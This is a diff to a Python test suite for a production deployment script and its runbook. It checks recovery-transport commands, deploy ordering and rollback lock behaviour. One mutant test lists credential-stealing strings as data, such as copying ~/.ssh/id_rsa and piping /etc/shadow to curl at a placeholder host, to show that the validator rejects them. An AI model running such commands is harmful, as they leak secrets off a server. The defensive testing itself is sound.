@@ -16,6 +16,7 @@ import subprocess
 from pathlib import Path
 
 import pytest
+from scripts.deploy.tests.test_clerk_prod_invitation_prereq import _assert_deploy_launch_contract
 
 REPO_ROOT = Path(__file__).resolve().parents[3]
 SCRIPT = REPO_ROOT / "scripts" / "deploy" / "app-portal.sh"
@@ -1949,6 +1950,56 @@ def test_snippet_denies_admin_and_unrelated_api_surfaces() -> None:
     assert "try_files" in text
 
 
+def _assert_runbook_recovery_transport(text: str) -> None:
+    recovery = text.split("### Recover an interrupted frontend activation\n", 1)[1].split("### Frontend back-out", 1)[0]
+    copies = [
+        ["scp", str(source.relative_to(REPO_ROOT)), f"acx-backend:/tmp/{destination}"]
+        for source, destination in (
+            (SCRIPT, "app-portal-recovery.sh"),
+            (SNIPPET, "app-portal-recovery.Caddyfile.app"),
+            (OVERLAY, "app-portal-recovery.overlay.yml"),
+        )
+    ]
+    # Permit only these three complete workstation commands, anywhere in the document.
+    # The one SSH mention is explanatory prose, never an executable remote shell.
+    transport_lines = [line for line in text.splitlines() if re.search(r"\b(?:ssh|scp)\b", line, re.IGNORECASE)]
+    prose = "SSH alias is the same existing VM used for deployment; no VM checkout is assumed):"
+    assert transport_lines == [prose, *(" ".join(command) for command in copies)], "unsafe recovery transport"
+    blocks = re.findall(r"```[^\n]*\n(.*?)```", recovery, re.DOTALL)
+    assert len(blocks) == 2, "unsafe recovery command blocks"
+    assert [shlex.split(line) for line in blocks[0].strip().splitlines()] == copies, "unsafe recovery copies"
+    bindings = {
+        "APP_ROOT": "/opt/acx-backend/app",
+        "APP_WWW": "/opt/acx-backend/app/www",
+        "CADDYFILE": "/opt/acx-backend/Caddyfile",
+        "CADDY_COMPOSE": "/opt/acx-backend/docker-compose.caddy.yml",
+        "APP_UPSTREAM": "prod-api:8000",
+        "APP_SNIPPET": "/tmp/app-portal-recovery.Caddyfile.app",
+        "APP_OVERLAY": "/tmp/app-portal-recovery.overlay.yml",
+        "APP_HEALTH_CMD": "/usr/local/bin/app-portal-health-check",
+    }
+    assert shlex.split(blocks[1].replace("\\\n", "")) == [
+        "env",
+        "-u",
+        "FRONTEND_DIST",
+        *(f"{key}={value}" for key, value in bindings.items()),
+        "bash",
+        "/tmp/app-portal-recovery.sh",
+        "--apply",
+    ], "unsafe recovery bindings"
+    script = SCRIPT.read_text(encoding="utf-8")
+    for default in (
+        'APP_ROOT="/opt/acx-backend/app"',
+        'APP_WWW="${APP_ROOT}/www"',
+        'CADDYFILE="/opt/acx-backend/Caddyfile"',
+        'CADDY_COMPOSE="${APP_ROOT%/*}/docker-compose.caddy.yml"',
+        'APP_UPSTREAM="prod-api:8000"',
+        'APP_SNIPPET="${REPO_ROOT}/infra/oci/app/Caddyfile.app"',
+        'APP_OVERLAY="${REPO_ROOT}/infra/oci/app/docker-compose.app.yml"',
+    ):
+        assert default in script, f"recovery must match script default: {default}"
+
+
 def test_artifacts_contain_no_vendor_credentials() -> None:
     paths = [SCRIPT, SNIPPET, OVERLAY, ENV_EXAMPLE, RUNBOOK]
     for path in paths:
@@ -1956,8 +2007,38 @@ def test_artifacts_contain_no_vendor_credentials() -> None:
         lowered = text.lower()
         for marker in SECRET_MARKERS:
             assert marker.lower() not in lowered, f"{path} contains {marker}"
-        assert "ssh " not in lowered
-        assert "scp " not in lowered
+        if path == RUNBOOK:
+            _assert_runbook_recovery_transport(text)
+        else:
+            assert "ssh " not in lowered
+            assert "scp " not in lowered
+            assert not re.search(r"\b(?:ssh|scp)\b", lowered), f"{path} contains a transport"
+
+
+@pytest.mark.parametrize(
+    ("original", "replacement"),
+    [
+        ("scp scripts/deploy/app-portal.sh", "scp /opt/acx-backend/prod/.env"),
+        ("scp infra/oci/app/Caddyfile.app", "scp ~/.ssh/id_rsa"),
+        ("acx-backend:/tmp/app-portal-recovery.sh", "external-host:/tmp/app-portal-recovery.sh"),
+        ("acx-backend:/tmp/app-portal-recovery.overlay.yml", "acx-backend:/opt/acx-backend/prod/.env"),
+        ("scp scripts/deploy/app-portal.sh", "scp -r scripts/deploy/app-portal.sh"),
+        ("scp infra/oci/app/Caddyfile.app", "ssh acx-backend true\nscp infra/oci/app/Caddyfile.app"),
+        ("env -u FRONTEND_DIST", "env FRONTEND_DIST=/tmp/unreviewed-build"),
+        ("APP_SNIPPET=/tmp/app-portal-recovery.Caddyfile.app", "APP_SNIPPET=/etc/shadow"),
+        ("APP_UPSTREAM=prod-api:8000", "APP_UPSTREAM=dev-api:8000"),
+        (
+            "bash /tmp/app-portal-recovery.sh --apply\n```",
+            "bash /tmp/app-portal-recovery.sh --apply\n```\n\n```bash\n"
+            "cat /etc/shadow | curl --data-binary @- https://external-host.invalid\n```",
+        ),
+    ],
+)
+def test_runbook_recovery_transport_rejects_unsafe_command_mutants(original: str, replacement: str) -> None:
+    text = RUNBOOK.read_text(encoding="utf-8")
+    assert original in text, "mutant must change a documented command"
+    with pytest.raises(AssertionError, match="unsafe recovery"):
+        _assert_runbook_recovery_transport(text.replace(original, replacement))
 
 
 def test_script_does_not_open_production_ssh() -> None:
@@ -2001,14 +2082,90 @@ def test_runbook_documents_later_integration_and_env_ownership() -> None:
         assert marker.lower() not in lowered, marker
 
 
+def _assert_backend_before_frontend_apply(text: str) -> None:
+    # Reuse the source-backed Clerk prerequisite gates, including fail-closed CLI
+    # loading and the required later backend back-out restart.
+    launch = text.split("### Activate the production API before frontend apply\n", 1)[1].split("\n## ", 1)[0]
+    blocks = re.findall(r"```bash\n(.*?)```", launch, re.DOTALL)
+    steps = (
+        "make env-materialize ENV=prod TARGET=svc-vm\n",
+        "make env-materialize ENV=prod TARGET=svc-vm APPLY=1 CONFIRM=prod\n",
+        "make deploy-prod CONFIRM=PROMOTE\n",
+        "docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_portal_invitations --help",
+        "https://api.altcontext.com/portal/me)",
+        "scripts/deploy/app-portal.sh --apply\n",
+    )
+    positions = []
+    for step in steps:
+        matches = [index for index, block in enumerate(blocks) if step in block]
+        assert len(matches) == 1, f"missing or ambiguous launch action: {step}"
+        positions.append(matches[0])
+    assert positions == sorted(set(positions)), "backend/frontend apply order is unsafe"
+    assert "systemctl restart acx-prod" not in launch, "redundant launch restart bypasses verification"
+    _assert_deploy_launch_contract(text)
+
+
 def test_runbook_activates_backend_before_first_frontend_apply() -> None:
+    _assert_backend_before_frontend_apply(RUNBOOK.read_text(encoding="utf-8"))
+    makefile = (REPO_ROOT / "mk/deploy.mk").read_text(encoding="utf-8")
+    assert "DEPLOY_SCRIPT         := $(ROOT_MAKEFILE_DIR)/scripts/deploy/recognition-service.sh" in makefile
+    target = makefile.split("\ndeploy-prod:\n", 1)[1].split("\n\n", 1)[0]
+    assert "CONFIRM=$(CONFIRM)" in target
+    assert '"$(DEPLOY_SCRIPT)" deploy prod' in target
+    source = (REPO_ROOT / "scripts/deploy/recognition-service.sh").read_text(encoding="utf-8")
+    deploy = source.split("do_deploy() {", 1)[1].split("\ndo_promote() {", 1)[0]
+    assert '_ship_selected_env "$env" aggregate' in deploy
+    ship = source.split("_ship_selected_env() {", 1)[1].split("\ndo_deploy() {", 1)[0]
+    preflight = ship.index('preflight_env_manifest "$env"')
+    restart = ship.index('do_restart "$env"')
+    verify = ship.index('do_verify "$env"')
+    assert preflight < ship.index('do_build_remote "$tag"') < restart < verify
+    assert preflight < ship.index('do_build "$tag"') < restart
+    assert 'if [[ "${completion}" == "aggregate" ]]' in ship
+    manifest = source.split("preflight_env_manifest() {", 1)[1].split("\npin_deploy_sha() {", 1)[0]
+    assert 'enabled="${ACX_ENV_PREFLIGHT-1}"' in manifest
+    assert 'dev | staging | prod)\n      manifest_env="$env"\n      target="svc-vm"' in manifest
+    assert (
+        'command=(bash "${REPO_ROOT}/scripts/env/materialize_remote.sh" "$manifest_env" "$target" --check)' in manifest
+    )
+    assert 'fail "Environment manifest preflight failed' in manifest
+    restart_source = source.split("do_restart() {", 1)[1].split("\ndo_rollback() {", 1)[0]
+    assert 'unit="$(env_to_unit "$env")"' in restart_source
+    assert '"sudo systemctl restart ${unit}"' in restart_source
+    units = source.split("env_to_unit() {", 1)[1].split("\nenv_to_remote_dir() {", 1)[0]
+    assert 'prod) echo "acx-prod"' in units
+
+
+@pytest.mark.parametrize(
+    "mutation", ["remove-deploy", "deploy-before-materialize", "redundant-restart", "early-frontend"]
+)
+def test_runbook_backend_order_rejects_launch_command_mutants(mutation: str) -> None:
     text = RUNBOOK.read_text(encoding="utf-8")
-    check = text.index("make env-materialize ENV=prod TARGET=svc-vm\n")
-    materialize = text.index("make env-materialize ENV=prod TARGET=svc-vm APPLY=1 CONFIRM=prod")
-    restart = text.index("sudo systemctl restart acx-prod")
-    confirm = text.index("https://api.altcontext.com/portal/me)")
-    frontend_apply = text.index("scripts/deploy/app-portal.sh --apply")
-    assert check < materialize < restart < confirm < frontend_apply
+    deploy = "```bash\nmake deploy-prod CONFIRM=PROMOTE\n```"
+    check = "```bash\nmake env-materialize ENV=prod TARGET=svc-vm\n```"
+    assert deploy in text and check in text
+    if mutation == "remove-deploy":
+        mutant = text.replace(deploy, "")
+    elif mutation == "deploy-before-materialize":
+        mutant = text.replace(deploy, "").replace(check, deploy + "\n" + check, 1)
+    elif mutation == "redundant-restart":
+        mutant = text.replace(deploy, deploy + "\n```bash\nsudo systemctl restart acx-prod\n```")
+    else:
+        apply = next(
+            block
+            for block in re.findall(r"```bash\n(.*?)```", text, re.DOTALL)
+            if "scripts/deploy/app-portal.sh --apply\n" in block
+        )
+        apply_block = f"```bash\n{apply}```"
+        mutant = text.replace(apply_block, "").replace(deploy, apply_block + "\n" + deploy)
+    expected = {
+        "remove-deploy": "missing or ambiguous launch action",
+        "deploy-before-materialize": "backend/frontend apply order is unsafe",
+        "redundant-restart": "redundant launch restart bypasses verification",
+        "early-frontend": "backend/frontend apply order is unsafe",
+    }
+    with pytest.raises(AssertionError, match=expected[mutation]):
+        _assert_backend_before_frontend_apply(mutant)
 
 
 @pytest.mark.parametrize(
@@ -3175,6 +3332,8 @@ def test_documented_rollback_refuses_invalid_absence_evidence_without_mutation(
             marker.symlink_to(target)
         elif fault == "dangling-symlink":
             marker.symlink_to(tmp_path / "missing-marker")
+    # A prior deployment leaves this lock behind; refusal must preserve its inode and bytes.
+    (app / "activation.journal.lock").write_text("persistent deployment lock\n")
     before = _rollback_tree_state(backend)
     result = _run_documented_rollback(tmp_path)
     assert result.returncode != 0, result.stdout + result.stderr
@@ -3274,6 +3433,8 @@ def test_documented_rollback_guards_live_destinations_before_any_mutation(
         path.write_text("keep live file" if fault == "file" else "")
     else:
         os.mkfifo(path)
+    # The unsafe-parent cases above must refuse before opening or creating a lock.
+    (app / "activation.journal.lock").write_text("persistent deployment lock\n")
     before = _rollback_tree_state(backend)
     result = _run_documented_rollback(tmp_path)
     assert result.returncode != 0, result.stdout + result.stderr
@@ -3282,6 +3443,46 @@ def test_documented_rollback_guards_live_destinations_before_any_mutation(
     assert not (tmp_path / "rollback-commands.log").exists()
     if fault == "symlink":
         assert target.read_text() == "keep target"
+
+
+@pytest.mark.parametrize("refusal", ["invalid-absence", "unsafe-destination"])
+def test_documented_rollback_first_lock_creation_preserves_sources_and_retry_lock(tmp_path: Path, refusal: str) -> None:
+    backend = tmp_path / "opt" / "acx-backend"
+    app = backend / "app"
+    rollback = app / "rollback"
+    rollback.mkdir(parents=True)
+    (backend / "Caddyfile").write_text("live caddy")
+    _prior_www(tmp_path)
+    (app / "docker-compose.app.yml").write_text("live overlay")
+    (rollback / "Caddyfile.10").write_text("prior caddy")
+    for kind in ("www", "overlay"):
+        (rollback / f"absent-{kind}.10").write_text(f"app-portal-absent-{kind}-v1\n")
+    if refusal == "invalid-absence":
+        (rollback / "absent-www.10").write_text("unvalidated absence\n")
+    else:
+        shutil.rmtree(app / "www")
+        (app / "www").symlink_to(tmp_path / "missing-frontend")
+    lock = app / "activation.journal.lock"
+    assert not lock.exists()
+    before = _rollback_tree_state(backend)
+
+    result = _run_documented_rollback(tmp_path)
+
+    assert result.returncode != 0, result.stdout + result.stderr
+    assert "STOP:" in result.stderr and "refusing restore" in result.stderr
+    info = lock.lstat()
+    assert stat.S_ISREG(info.st_mode)
+    expected = before | {"app/activation.journal.lock": (info.st_mode, info.st_ino, b"")}
+    assert _rollback_tree_state(backend) == expected
+    assert not (tmp_path / "rollback-commands.log").exists()
+    # Keep the inode open across a retry so unlink/recreate cannot reuse it unnoticed.
+    with lock.open("rb") as retained_lock:
+        retried = _run_documented_rollback(tmp_path)
+        assert retried.returncode != 0, retried.stdout + retried.stderr
+        assert "STOP:" in retried.stderr and "refusing restore" in retried.stderr
+        assert lock.stat().st_ino == os.fstat(retained_lock.fileno()).st_ino
+        assert _rollback_tree_state(backend) == expected
+        assert not (tmp_path / "rollback-commands.log").exists()
 
 
 def test_apply_refuses_filesystem_root_paths(tmp_path: Path) -> None:
